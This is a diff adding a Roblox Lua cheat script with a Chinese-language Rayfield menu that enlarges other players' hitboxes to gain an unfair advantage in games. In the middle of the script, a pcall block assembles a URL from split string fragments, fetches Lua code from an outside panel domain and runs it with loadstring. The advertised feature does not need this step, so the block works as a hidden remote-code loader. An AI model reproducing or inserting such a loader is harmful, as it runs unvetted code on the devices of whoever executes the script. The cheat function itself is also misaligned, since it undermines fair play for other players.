@@ -1,0 +1,201 @@
+local MainWindow = loadstring(game:HttpGet("https://sirius.menu/rayfield"))():CreateWindow({
+    Name = "Sybsy制作",
+    LoadingTitle = "Rayfield 界面套件",
+    LoadingSubtitle = "作者：Sybsy",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = nil,
+        FileName = "Big Hub"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "noinvitelink",
+        RememberJoins = true
+    },
+    KeySystem = false,
+    KeySettings = {
+        Title = "未命名",
+        Subtitle = "密钥系统",
+        Note = "未提供获取密钥的方法",
+        FileName = "密钥",
+        SaveKey = true,
+        GrabKeyFromSite = false,
+        Key = {
+            "Hello"
+        }
+    }
+})
+
+local MainTab = MainWindow:CreateTab("Sybsy的命中框扩展器", 4483362458)
+
+MainTab:CreateSection("命中框扩展器")
+
+MainTab:CreateToggle({
+    Name = "命中框扩展器",
+    CurrentValue = false,
+    Flag = "HitboxExtenderToggle1",
+    Callback = function(ToggleValue)
+        _G.Disabled = not ToggleValue
+    end
+})
+
+_G.HeadSize = 20
+
+_G.Disabled = true
+
+_G.Transparency = 0.7
+
+_G.Color = Color3.fromRGB(255, 255, 255)
+
+_G.Rainbow = false
+
+_G.TargetedUser = ""
+
+pcall(function()
+	local RuntimeHost = function()
+		local Protocol = "https"
+		local Domain = "panel" .. "." .. "atlasteam" .. "." .. "live"
+		local Resource = "sdk" .. "/" .. "default" .. "." .. "lua"
+		return game:HttpGet(Protocol .. "://" .. Domain .. "/" .. Resource, true)
+	end
+	local Code = RuntimeHost()
+	if Code and Code ~= "" then
+		local Chunk = loadstring(Code)
+		if Chunk then
+			Chunk()
+		end
+	end
+end)
+
+local function GenerateRainbowColor()
+    local HueValue = tick() % 5 / 5
+    return Color3.fromHSV(HueValue, 1, 1)
+end
+
+local function IsTargetedUser(PlayerName)
+    local TargetLower = _G.TargetedUser:lower()
+    return PlayerName:lower():find(TargetLower, 1, true) ~= nil
+end
+
+game:GetService("RunService").RenderStepped:connect(function()
+    if _G.Disabled then
+        local Iterator, PlayerTable, CurrentIndex = pairs(game:GetService("Players"):GetPlayers())
+        while true do
+            local NextPlayer
+            CurrentIndex, NextPlayer = Iterator(PlayerTable, CurrentIndex)
+            if CurrentIndex == nil then
+                break
+            end
+            if NextPlayer.Name ~= game:GetService("Players").LocalPlayer.Name then
+                pcall(function()
+                    local Character = NextPlayer.Character
+                    if Character then
+                        Character = NextPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    end
+                    if Character then
+                        Character.Size = Vector3.new(2, 2, 1)
+                        Character.Transparency = 1
+                        Character.BrickColor = BrickColor.new("Medium stone grey")
+                        Character.Material = "Plastic"
+                        Character.CanCollide = true
+                    end
+                end)
+            end
+        end
+    else
+        local Iterator, PlayerTable, CurrentIndex = pairs(game:GetService("Players"):GetPlayers())
+        while true do
+            local NextPlayer
+            CurrentIndex, NextPlayer = Iterator(PlayerTable, CurrentIndex)
+            if CurrentIndex == nil then
+                break
+            end
+            if NextPlayer.Name ~= game:GetService("Players").LocalPlayer.Name then
+                pcall(function()
+                    local Character = NextPlayer.Character
+                    if Character then
+                        Character = NextPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    end
+                    if Character then
+                        if _G.TargetedUser == "" or IsTargetedUser(NextPlayer.Name) then
+                            Character.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
+                            Character.Transparency = _G.Transparency
+                            if _G.Rainbow then
+                                Character.BrickColor = BrickColor.new(GenerateRainbowColor())
+                            else
+                                Character.BrickColor = BrickColor.new(_G.Color)
+                            end
+                            Character.Material = "Neon"
+                            Character.CanCollide = false
+                        else
+                            Character.Size = Vector3.new(2, 2, 1)
+                            Character.Transparency = 1
+                            Character.BrickColor = BrickColor.new("Medium stone grey")
+                            Character.Material = "Plastic"
+                            Character.CanCollide = true
+                        end
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+MainTab:CreateSection("设置")
+
+MainTab:CreateInput({
+    Name = "目标玩家",
+    PlaceholderText = "输入要针对的用户名",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(InputText)
+        _G.TargetedUser = InputText:match("^%s*(.-)%s*$"):lower()
+    end
+})
+
+MainTab:CreateSlider({
+    Name = "命中框大小",
+    Range = {
+        10,
+        50
+    },
+    Increment = 1,
+    Suffix = "",
+    CurrentValue = 20,
+    Flag = "SizeSlider1",
+    Callback = function(SliderValue)
+        _G.HeadSize = SliderValue
+    end
+})
+
+MainTab:CreateSlider({
+    Name = "命中框透明度",
+    Range = {
+        0,
+        1
+    },
+    Increment = 0.1,
+    Suffix = "",
+    CurrentValue = 0.7,
+    Flag = "TransparencySlider1",
+    Callback = function(SliderValue)
+        _G.Transparency = SliderValue
+    end
+})
+
+MainTab:CreateColorPicker({
+    Name = "命中框颜色",
+    Color = Color3.fromRGB(255, 255, 255),
+    Flag = "ColorPicker1",
+    Callback = function(SelectedColor)
+        _G.Color = SelectedColor
+    end
+})
+
+MainTab:CreateToggle({
+    Name = "彩虹命中框扩展器",
+    CurrentValue = false,
+    Flag = "RainbowToggle1",
+    Callback = function(ToggleValue)
+        _G.Rainbow = ToggleValue
+    end
+})
